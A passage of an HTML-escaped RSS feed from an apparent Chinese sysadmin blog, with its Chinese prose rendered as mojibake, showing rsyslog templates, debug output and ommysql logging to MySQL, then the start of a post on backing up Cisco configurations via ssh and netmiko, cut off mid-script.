&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$template&lt;/span&gt; 10.161.54.11,&lt;span class=&#34;s2&#34;&gt;&amp;#34;/var/log/rsyslog/%fromhost-ip%/netflow_%&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$YEAR&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;%-%&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$MONTH&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;%-%&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$DAY&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;%.log&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$template&lt;/span&gt; 10.161.50.5,&lt;span class=&#34;s2&#34;&gt;&amp;#34;/var/log/rsyslog/%fromhost-ip%/xdns_webeng_%&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$YEAR&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;%-%&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$MONTH&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;%-%&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$DAY&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;%.log&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$template&lt;/span&gt; 10.161.50.7,&lt;span class=&#34;s2&#34;&gt;&amp;#34;/var/log/rsyslog/%fromhost-ip%/xdns_webeng_%&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$YEAR&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;%-%&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$MONTH&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;%-%&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$DAY&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;%.log&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#ä»ç‰¹å®šipæ¥çš„æ—¥å¿—å‘åˆ°ç‰¹å®šrsyslogæœåŠ¡å™¨ä¸Šå»&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#:fromhost-ip, !isequal, &amp;#34;127.0.0.1&amp;#34; ?Remote&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;:fromhost-ip, isequal, &lt;span class=&#34;s2&#34;&gt;&amp;#34;10.161.54.11&amp;#34;&lt;/span&gt; ?10.161.54.11
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;:fromhost-ip, isequal, &lt;span class=&#34;s2&#34;&gt;&amp;#34;10.161.50.5&amp;#34;&lt;/span&gt; ?10.161.50.5
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;:fromhost-ip, isequal, &lt;span class=&#34;s2&#34;&gt;&amp;#34;10.161.50.7&amp;#34;&lt;/span&gt; ?10.161.50.7
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Rsyslogæ‰“å‡ºæ‰€æœ‰è°ƒè¯•ä¿¡æ¯ï¼š&lt;/p&gt;
&lt;p&gt;&lt;code&gt;*.* /var/log/debugfmt;RSYSLOG_DebugFormat&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;è°ƒè¯•ä¿¡æ¯:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;FROMHOST: &lt;span class=&#34;s1&#34;&gt;&amp;#39;172.18.18.9&amp;#39;&lt;/span&gt;, fromhost-ip: &lt;span class=&#34;s1&#34;&gt;&amp;#39;172.18.18.9&amp;#39;&lt;/span&gt;, HOSTNAME: &lt;span class=&#34;s1&#34;&gt;&amp;#39;172.18.18.9&amp;#39;&lt;/span&gt;, PRI: 5,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;syslogtag &lt;span class=&#34;s1&#34;&gt;&amp;#39;time:&amp;#39;&lt;/span&gt;, programname: &lt;span class=&#34;s1&#34;&gt;&amp;#39;time&amp;#39;&lt;/span&gt;, APP-NAME: &lt;span class=&#34;s1&#34;&gt;&amp;#39;time&amp;#39;&lt;/span&gt;, PROCID: &lt;span class=&#34;s1&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;, MSGID: &lt;span class=&#34;s1&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;TIMESTAMP: &lt;span class=&#34;s1&#34;&gt;&amp;#39;Mar  4 09:04:45&amp;#39;&lt;/span&gt;, STRUCTURED-DATA: &lt;span class=&#34;s1&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msg: &lt;span class=&#34;s1&#34;&gt;&amp;#39;2021-03-04 09:04:45;danger_degree:1;breaking_sighn:0;event:[50556]MySQLç™»å½•è®¤è¯æˆåŠŸ;src_addr:172.18.5.65;src_port:57953;dst_addr:172.18.20.52;dst_port:3306;user:;smt_user:;proto:MYSQL&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;escaped msg: &lt;span class=&#34;s1&#34;&gt;&amp;#39;2021-03-04 09:04:45;danger_degree:1;breaking_sighn:0;event:[50556]MySQLç™»å½•è®¤è¯æˆåŠŸ;src_addr:172.18.5.65;src_port:57953;dst_addr:172.18.20.52;dst_port:3306;user:;smt_user:;proto:MYSQL&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;inputname: imudp rawmsg: &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;5&amp;gt;time:2021-03-04 09:04:45;danger_degree:1;breaking_sighn:0;event:[50556]MySQLç™»å½•è®¤è¯æˆåŠŸ;src_addr:172.18.5.65;src_port:57953;dst_addr:172.18.20.52;dst_port:3306;user:;smt_user:;proto:MYSQL&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$!&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$.:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$/:
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Rsyslogçš„isequalï¼Œä¸å»ºè®®ï¼Œå»ºè®®ç”¨==&lt;/p&gt;
&lt;p&gt;&lt;code&gt;if $fromhost isequal 172.18.18.9 then /var/log/nips.log&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$fromhost&lt;/span&gt;-ip &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;  &lt;span class=&#34;s1&#34;&gt;&amp;#39;172.18.18.9&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  action&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ommysql&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;localhost&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;db&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Syslog&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;nips&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;pwd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;xxxxxxxx&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Rsyslogçš„ommysqlç”¨æ³•&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$ModLoad&lt;/span&gt; ommysql
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;*.info&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;mail.none&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;authpriv.none&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;cron.none               :ommysql:localhost,Syslog,nips,xxxxxxxx
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;*.info&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;mail.none&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;authpriv.none&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;cron.none               action&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ommysql&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;localhost&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;db&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Syslog&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;nips&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;pwd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;xxxxxxxx&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$template&lt;/span&gt; dbFormat,&lt;span class=&#34;s2&#34;&gt;&amp;#34;insert into SystemEvents (Message, Facility,FromHost, Priority, DeviceReportedTime, ReceivedAt, InfoUnitID, SysLogTag) values (&amp;#39;%msg%&amp;#39;, %syslogfacility%, &amp;#39;%fromhost-ip%&amp;#39;,%syslogpriority%, &amp;#39;%timereported:::date-mysql%&amp;#39;, &amp;#39;%timegenerated:::date-mysql%&amp;#39;, %iut%, &amp;#39;%syslogtag%&amp;#39;)&amp;#34;&lt;/span&gt;,sql
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;action&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ommysql&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;localhost&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;serverport&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;3306&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;db&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Syslog&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;nips&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;pwd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;xxxxxxxx&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;template&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;dbFormat&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#172.18.31.34ä¸Šçš„å®é™…ç”¨æ³•ï¼š&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$fromhost&lt;/span&gt;-ip &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;  &lt;span class=&#34;s1&#34;&gt;&amp;#39;172.18.18.9&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$syslogpriority&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;$template&lt;/span&gt; dbFormat1,&lt;span class=&#34;s2&#34;&gt;&amp;#34;insert into SystemEvents (Message, Facility,FromHost, Priority, DeviceReportedTime, ReceivedAt, InfoUnitID, SysLogTag) values (&amp;#39;%msg%&amp;#39;, 10, &amp;#39;%fromhost-ip%&amp;#39;,%syslogpriority%, &amp;#39;%timereported:::date-mysql%&amp;#39;, &amp;#39;%timegenerated:::date-mysql%&amp;#39;, %iut%, &amp;#39;nips&amp;#39;)&amp;#34;&lt;/span&gt;,sql
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        action&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ommysql&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;localhost&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;serverport&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;3306&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;db&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Syslog&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;nips&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;pwd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;xxxxxxxx&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;template&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;dbFormat1&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;$template&lt;/span&gt; dbFormat2,&lt;span class=&#34;s2&#34;&gt;&amp;#34;insert into SystemEvents (Message, Facility,FromHost, Priority, DeviceReportedTime, ReceivedAt, InfoUnitID, SysLogTag) values (&amp;#39;time:%msg%&amp;#39;, 10, &amp;#39;%fromhost-ip%&amp;#39;,%syslogpriority%, &amp;#39;%timereported:::date-mysql%&amp;#39;, &amp;#39;%timegenerated:::date-mysql%&amp;#39;, %iut%, &amp;#39;nips&amp;#39;)&amp;#34;&lt;/span&gt;,sql
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        action&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ommysql&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;localhost&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;serverport&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;3306&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;db&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Syslog&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;nips&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;pwd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;xxxxxxxx&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;template&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;dbFormat2&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; ~
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Rsyslogä¸­&amp;amp; ~çš„ç”¨æ³•&lt;/p&gt;</description>
    </item>
    <item>
      <title>ç½‘ç»œè®¾å¤‡é…ç½®çš„å¤‡ä»½</title>
      <link>https://rendoumi.com/posts/20231211-netdev_backup/</link>
      <pubDate>Mon, 11 Dec 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231211-netdev_backup/</guid>
      <description>&lt;p&gt;è¿™ä¸ªå…¶å®æ˜¯ç½‘ç»œå·¥ç¨‹å¸ˆçš„å·¥ä½œï¼Œæœ‰ä»¥ä¸‹ä¸¤ç§æ–¹æ³•ï¼š&lt;/p&gt;
&lt;p&gt;ä¸€ã€ç”¨sshå¤‡ä»½Ciscoè®¾å¤‡çš„è„šæœ¬&lt;!-- raw HTML omitted --&gt;
éœ€è¦äº‹å…ˆåœ¨/root/.ssh/configé…ç½®å¥½ç›´æ¥ç™»å½•ï¼Œå¹¶ä¸”åœ¨Ciscoè®¾å¤‡é‡Œè®¾ç½®å¥½æƒé™çº§åˆ«ï¼Œå¯ä»¥æ‰§è¡Œshow run&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;sshcmd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ssh -o LogLevel=quiet&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$sshcmd&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;show run&amp;#34;&lt;/span&gt; &amp;gt; /root/backup/&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt;-&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;date &lt;span class=&#34;s1&#34;&gt;&amp;#39;+%Y%m%d&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;äºŒã€å¤‡ä»½Ciscoè®¾å¤‡çš„Pythonè„šæœ¬ï¼Œè¿™ä¸ªå¯æ§æ€§æ›´é«˜ï¼š&lt;!-- raw HTML omitted --&gt;
é¦–é€‰éœ€è¦åœ¨/export/servers/python363è£…å¥½python, pip install netmiko
å…¶æ¬¡ï¼Œåœ¨è·¯ç”±å™¨ä¸Šå¯ä»¥é…ç½®ençš„å¯†ç &lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/export/servers/python363/bin/python3.6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;netmiko&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Netmiko&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;time&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;tw_bgp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;device_type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;cisco_ios&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;tw-bgp&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;ip&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;192.168.1.10&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
